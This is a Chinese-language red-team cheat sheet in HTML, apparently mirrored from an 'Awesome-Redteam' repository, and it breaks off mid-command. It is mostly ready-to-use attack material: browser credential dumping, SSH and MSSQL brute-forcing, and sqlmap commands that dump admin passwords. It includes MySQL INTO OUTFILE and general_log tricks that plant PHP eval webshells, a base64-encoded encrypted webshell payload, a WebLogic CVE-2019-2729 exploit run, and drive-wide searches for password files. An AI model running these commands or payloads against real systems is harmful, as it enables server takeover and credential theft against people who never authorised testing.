<h3 id="HackBrowerserData"><a href="#HackBrowerserData" class="headerlink" title="HackBrowerserData"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#hackbrowerserdata"></a>HackBrowerserData</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; .\hack-browser-data.exe -b all -f json --dir results -zip<br></code></pre></td></tr></table></figure>

<h3 id="kscan"><a href="#kscan" class="headerlink" title="kscan"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#kscan"></a>kscan</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 端口扫描<br>kscan -t 192.168.174.1/24<br><br># 存活网段<br>kscan --spy<br><br># 暴力破解<br>kscan -t 192.168.174.128 --hydra<br><br># CDN识别<br>kscan -t www.baidu.com<br></code></pre></td></tr></table></figure>

<h3 id="ksubdomain"><a href="#ksubdomain" class="headerlink" title="ksubdomain"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#ksubdomain"></a>ksubdomain</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">使用内置字典爆破</span><br>ksubdomain -d seebug.org<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用字典爆破域名</span><br>ksubdomain -d seebug.org -f subdomains.dict<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">字典里都是域名，可使用验证模式</span><br>ksubdomain -f dns.txt -verify<br></code></pre></td></tr></table></figure>

<h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#mysql"></a>mysql</h3><p>不登录直接执行sql语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mysql -uroot -ppassword test -e &quot;select now()&quot; -N &gt; test.txt<br>mysql -uroot -e &quot;show databases;&quot; &gt; test.txt<br></code></pre></td></tr></table></figure>

<p>getshell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">show variables like &#x27;%secure%&#x27;    <br>select &#x27;&lt;?php eval($_POST[xxx]) ?&gt;&#x27; into outfile &#x27;/var/www/xx.php&#x27;;  <br>select &#x27;&lt;?php eval($_POST[xx]) ?&gt;&#x27; into dumpfile &#x27;/var/www/xx.php&#x27;;  <br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">set global general_log=on;  <br>set global general_log_file=&#x27;/var/www/1.php&#x27;;  <br>select &#x27;&lt;?php eval($_POST[s6]) ?&gt;&#x27;;<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select &#x27;&lt;?php file_put_contents(&quot;index.php&quot;,base64_decode(&quot;Jmx0Oz9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQogICAgJGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7IA0KCSRfU0VTU0lPTlsmIzM5O2smIzM5O109JGtleTsNCgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsNCglpZighZXh0ZW5zaW9uX2xvYWRlZCgmIzM5O29wZW5zc2wmIzM5OykpDQoJew0KCQkkdD0iYmFzZTY0XyIuImRlY29kZSI7DQoJCSRwb3N0PSR0KCRwb3N0LiIiKTsNCgkJDQoJCWZvcigkaT0wOyRpJmx0O3N0cmxlbigkcG9zdCk7JGkrKykgew0KICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgDQogICAgCQkJfQ0KCX0NCgllbHNlDQoJew0KCQkkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsNCgl9DQogICAgJGFycj1leHBsb2RlKCYjMzk7fCYjMzk7LCRwb3N0KTsNCiAgICAkZnVuYz0kYXJyWzBdOw0KICAgICRwYXJhbXM9JGFyclsxXTsNCgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2ludm9rZSgkcCkge2V2YWwoJHAuIiIpO319DQogICAgQGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7DQo/Jmd0Ow0K&quot;));?&gt;&#x27; into outfile &#x27;C:/www/index.php&#x27;;<br></code></pre></td></tr></table></figure>

<h3 id="medusa"><a href="#medusa" class="headerlink" title="medusa"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#medusa"></a>medusa</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 语法规则<br>Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] -M module<br><br># 选项<br>-h 目标名或IP  -H 目标列表<br>-u 用户名 -U 用户名字典<br>-p 密码 -P 密码字典 -f 爆破成功停止 -M 指定服务 -t 线程<br>-n 指定端口 -e ns 尝试空密码和用户名密码相同<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">medusa -h ip -u sa -P /pass.txt -t 5 -f -M mssql<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">medusa -h ip -U /root/user.txt -P /pass.txt -t 5 -f -M mssql<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># MySQL破解<br>medusa -h ip -u sa -P pass.txt -t 5 -f -M mssql<br><br># SSH破解<br>medusa -H host.txt -U user.txt -p password -M ssh<br></code></pre></td></tr></table></figure>

<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#nmap"></a>nmap</h3><ul>
<li>内网尽量不要使用nmap，用hping3代替</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 选项<br>-sn 只做 PING 扫描，不做端口扫描<br>-sV 探测开放的端口的系统/服务信息<br>-sP PING 扫描（打印出对 PING 扫描做出响应的主机，不进行进一步测试，无法用于端口扫描）<br>-sT TCP Connect 扫描<br>-sS TCP SYN 扫描<br>-sU UDP 扫描<br><br>--script=&lt;Lua scripts&gt; 指定脚本名称<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">nmap -sn 1.1.1.0/24<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">nmap -sV 1.1.1.1 -p 8080<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">nmap -p445 1.1.1.1 --script smb-vuln-ms17-010<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -p 1-65535 -iL ip.txt -oX output.xml<br></code></pre></td></tr></table></figure>

<h3 id="OneForAll"><a href="#OneForAll" class="headerlink" title="OneForAll"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#oneforall"></a>OneForAll</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">python oneforall.py --target example.com run<br>python oneforall.py --targets ./example.txt run<br></code></pre></td></tr></table></figure>

<h3 id="scaninfo"><a href="#scaninfo" class="headerlink" title="scaninfo"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#scaninfo"></a>scaninfo</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">scaninfo -uf  url.txt -m  webfinger  web指纹识别<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">scaninfo  -i  192.168.0.0/24  -p  1-65535  -eq 53  -m port 端口扫描<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">scaninfo  -i  192.168.0.0/24  -l ip.txt  -uf  url.txt -t1000   可以组合各种目标ip段ip文件url文件 <br></code></pre></td></tr></table></figure>

<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#sqlmap"></a>sqlmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 选项<br>--file-read=RFILE   从后端的数据库管理系统文件系统读取文件<br>--dump                转储数据库表项<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python sqlmap.py -u &quot;https://www.xxx.com/post.php?id=1&quot; --proxy &quot;http://127.0.0.1:1080&quot;<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python sqlmap.py  -u &quot;http://www.xxx.com&quot; –cookie &quot;id=11&quot; --level 2<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python sqlmap.py -u &quot;www.xxxx.com/product/detail/id/3*.html&quot; --dbms=mysql -v 3 <br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python sqlmap.py -u &quot;http://www.xxx.com/post.php?id=1&quot;  --dbms mysql  --dbs<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python sqlmap.py -u &quot;http://www.xxx.com/post.php?id=1&quot;  --dbms mysql  -D test --tables<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python sqlmap.py -u &quot;http://www.xxx.com/post.php?id=1&quot;  --dbms mysql  -D test -T admin –-columns<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python sqlmap.py -u &quot;http://www.xxx.com/post.php?id=1&quot;  --dbms mysql -D test -T admin -C &quot;username,password&quot; --dump<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python sqlmap.py -r &quot;c:\url.txt&quot; -p id –dbms mysql –file-read=&quot;C:/example.exe&quot;<br></code></pre></td></tr></table></figure>

<h3 id="TideFinger"><a href="#TideFinger" class="headerlink" title="TideFinger"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#tidefinger"></a>TideFinger</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python TideFinger.py -u http://192.168.0.1:8080/<br></code></pre></td></tr></table></figure>

<h3 id="URLFinder"><a href="#URLFinder" class="headerlink" title="URLFinder"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#urlfinder"></a>URLFinder</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">URLFinder.exe -u http://ip -s all -m 2<br>URLFinder.exe -u http://ip -s 200,403 -m 2<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">URLFinder.exe -s all -m 2 -f url.txt -o D:/<br></code></pre></td></tr></table></figure>

<h3 id="Vulmap"><a href="#Vulmap" class="headerlink" title="Vulmap"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#vulmap"></a>Vulmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python vulmap.py -u http://example.com<br>python vulmap.py -f list.txt<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 检查站点是否存在 struts2 漏洞<br>python3 vulmap.py -u http://example.com -a struts2<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 对 http://example.com:7001 进行 WebLogic 的 CVE-2019-2729 漏洞利用<br>python3 vulmap.py -u http://example.com:7001 -v CVE-2019-2729<br>python3 vulmap.py -u http://example.com:7001 -m exp -v CVE-2019-2729<br></code></pre></td></tr></table></figure>

<h3 id="Xray"><a href="#Xray" class="headerlink" title="Xray"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#xray"></a>Xray</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">网络扫描</span><br>.\xray_windows_386.exe webscan --listen 127.0.0.1:7777 --html-output xray.html<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">服务扫描</span><br>.\xray_windows_386.exe servicescan --target 1.1.1.1:8080<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">指定插件</span><br>xray webscan --plugins cmd-injection,sqldet --url http://example.comxray webscan --plugins cmd-injection,sqldet --listen 127.0.0.1:7777<br></code></pre></td></tr></table></figure>

<h2 id="数据库连接"><a href="#数据库连接" class="headerlink" title="数据库连接"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5"></a>数据库连接</h2><h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#redis"></a>Redis</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">redis-cli -h 目标主机IP地址 -p 端口号<br></code></pre></td></tr></table></figure>

<h3 id="Postgresql"><a href="#Postgresql" class="headerlink" title="Postgresql"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#postgresql"></a>Postgresql</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 查询当前db中所有表的信息<br>select * from pg_tables<br></code></pre></td></tr></table></figure>

<h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"></a>内网信息收集</h2><h3 id="重要端口及服务"><a href="#重要端口及服务" class="headerlink" title="重要端口及服务"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E9%87%8D%E8%A6%81%E7%AB%AF%E5%8F%A3%E5%8F%8A%E6%9C%8D%E5%8A%A1"></a>重要端口及服务</h3><table>
<thead>
<tr>
<th>port</th>
<th>service</th>
<th>description</th>
</tr>
</thead>
<tbody><tr>
<td>21</td>
<td>FTP</td>
<td>FTP控制端口，检查匿名登录、弱口令</td>
</tr>
<tr>
<td>22</td>
<td>SSH</td>
<td>SSH远程登录协议，检查弱口令</td>
</tr>
<tr>
<td>23</td>
<td>Telnet</td>
<td>Telnet终端仿真协议</td>
</tr>
<tr>
<td>53</td>
<td>DNS服务</td>
<td></td>
</tr>
<tr>
<td>80</td>
<td>Web</td>
<td>检查常见Web漏洞及管理后台</td>
</tr>
<tr>
<td>111</td>
<td>NFS</td>
<td>网络文件系统</td>
</tr>
<tr>
<td>389</td>
<td>LDAP</td>
<td>轻型目录访问协议，检查是否存在匿名访问</td>
</tr>
<tr>
<td>443</td>
<td>OpenSSL</td>
<td>检查心脏滴血及Web漏洞</td>
</tr>
<tr>
<td>445</td>
<td>SMB</td>
<td>检查是否存在MS17-010、MS08-067漏洞</td>
</tr>
<tr>
<td>512</td>
<td>Rexec</td>
<td>检查远程shell命令及暴力破解</td>
</tr>
<tr>
<td>873</td>
<td>Rsync</td>
<td>检查匿名登录、弱口令</td>
</tr>
<tr>
<td>1433</td>
<td>SQL Server</td>
<td>数据库服务</td>
</tr>
<tr>
<td>1521</td>
<td>Oracle</td>
<td>数据库服务</td>
</tr>
<tr>
<td>2049</td>
<td>NFS</td>
<td>NFS未授权访问</td>
</tr>
<tr>
<td>2181</td>
<td>Zookeeper</td>
<td>分布式协调系统</td>
</tr>
<tr>
<td>2375</td>
<td>Docker Remote</td>
<td>API未授权访问</td>
</tr>
<tr>
<td>3306</td>
<td>MySQL</td>
<td>数据库服务</td>
</tr>
<tr>
<td>3389</td>
<td>RDP</td>
<td>远程桌面</td>
</tr>
<tr>
<td>4848</td>
<td>GlassFish</td>
<td>未授权访问</td>
</tr>
<tr>
<td>5432</td>
<td>PostgreSQL</td>
<td>数据库服务</td>
</tr>
<tr>
<td>5601</td>
<td>Kibana</td>
<td>开源分析及可视化平台</td>
</tr>
<tr>
<td>5672</td>
<td>RabbitMQ</td>
<td>开源消息队列服务软件</td>
</tr>
<tr>
<td>5900</td>
<td>VNC</td>
<td>远程桌面控制软件，检查弱口令</td>
</tr>
<tr>
<td>5984</td>
<td>CouchDB</td>
<td>数据库服务</td>
</tr>
<tr>
<td>6379</td>
<td>Redis</td>
<td>数据库服务</td>
</tr>
<tr>
<td>7001</td>
<td>Weblogic</td>
<td>Weblogic Console默认端口</td>
</tr>
<tr>
<td>8000-9090</td>
<td>Web</td>
<td>常见Web端口，运维一般将管理后台开在这些非80端口上</td>
</tr>
<tr>
<td>8080</td>
<td>Jenkins</td>
<td></td>
</tr>
<tr>
<td>8080</td>
<td>Kubernetes Api Server</td>
<td></td>
</tr>
<tr>
<td>8081</td>
<td>Apache-Flink</td>
<td></td>
</tr>
<tr>
<td>8089</td>
<td>Druid</td>
<td></td>
</tr>
<tr>
<td>8090</td>
<td>Confluence</td>
<td></td>
</tr>
<tr>
<td>8095</td>
<td>Atlassian Crowd</td>
<td></td>
</tr>
<tr>
<td>8161</td>
<td>Active MQ</td>
<td></td>
</tr>
<tr>
<td>8888</td>
<td>Jupyter Notebook</td>
<td></td>
</tr>
<tr>
<td>8983</td>
<td>Solr</td>
<td></td>
</tr>
<tr>
<td>9000</td>
<td>Fast-CGI</td>
<td>对外访问可直接Get shell</td>
</tr>
<tr>
<td>9060</td>
<td>Websephere</td>
<td>管理端口</td>
</tr>
<tr>
<td>9092</td>
<td>Kafka</td>
<td>开源流处理平台</td>
</tr>
<tr>
<td>9200</td>
<td>Elasticsearch(http)</td>
<td>全文搜索引擎</td>
</tr>
<tr>
<td>9300</td>
<td>Elasticsearch(tcp)</td>
<td>全文搜索引擎</td>
</tr>
<tr>
<td>10000</td>
<td>Virualmin&#x2F;Webmin</td>
<td>服务器虚拟主机管理系统</td>
</tr>
<tr>
<td>10051</td>
<td>Zabbix</td>
<td>监控系统</td>
</tr>
<tr>
<td>11211</td>
<td>Memcache</td>
<td>分布式高速缓存系统，检查未授权访问</td>
</tr>
<tr>
<td>20880</td>
<td>Dubbo</td>
<td>阿里巴巴开源分布式服务框架</td>
</tr>
<tr>
<td>27017</td>
<td>MongoDB</td>
<td>数据库服务</td>
</tr>
<tr>
<td>28017</td>
<td>MongoDB</td>
<td>数据库服务（统计页面）</td>
</tr>
<tr>
<td>50030</td>
<td>Hadoop Hive</td>
<td></td>
</tr>
<tr>
<td>50070</td>
<td>Hadoop</td>
<td></td>
</tr>
</tbody></table>
<h3 id="Windows信息收集"><a href="#Windows信息收集" class="headerlink" title="Windows信息收集"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"></a>Windows信息收集</h3><h4 id="查找文件-find-x2F-findstr"><a href="#查找文件-find-x2F-findstr" class="headerlink" title="查找文件 find&#x2F;findstr"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E6%89%BE%E6%96%87%E4%BB%B6-findfindstr"></a>查找文件 find&#x2F;findstr</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 全盘查找文件，一定要加一个星号<br>for /r c:\ %i in (password.txt*) do @echo %i<br>for /r c:\ %i in (*.ini) do @echo %i<br><br># 查找 C 盘中包含 password 字样的文件，一定要双引号<br>findstr /s /n &quot;password&quot; c:\*<br><br># 查找 pwd.txt 中是否包含 password 字样，一定要双引号<br>find /N /I &quot;password&quot; pwd.txt<br></code></pre></td></tr></table></figure>

<h4 id="设置活动代码页编号-chcp"><a href="#设置活动代码页编号-chcp" class="headerlink" title="设置活动代码页编号 chcp"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E8%AE%BE%E7%BD%AE%E6%B4%BB%E5%8A%A8%E4%BB%A3%E7%A0%81%E9%A1%B5%E7%BC%96%E5%8F%B7-chcp"></a>设置活动代码页编号 chcp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">chcp 65001<br></code></pre></td></tr></table></figure>

<h4 id="查看系统信息-systeminfo"><a href="#查看系统信息-systeminfo" class="headerlink" title="查看系统信息 systeminfo"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF-systeminfo"></a>查看系统信息 systeminfo</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 查看全部信息<br>systeminfo<br><br># 查看英文版操作系统和版本信息<br>systeminfo | findstr /B /C:&quot;OS name&quot; /C:&quot;OS Version&quot;<br><br># 查看中文版操作系统和版本信息<br>systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 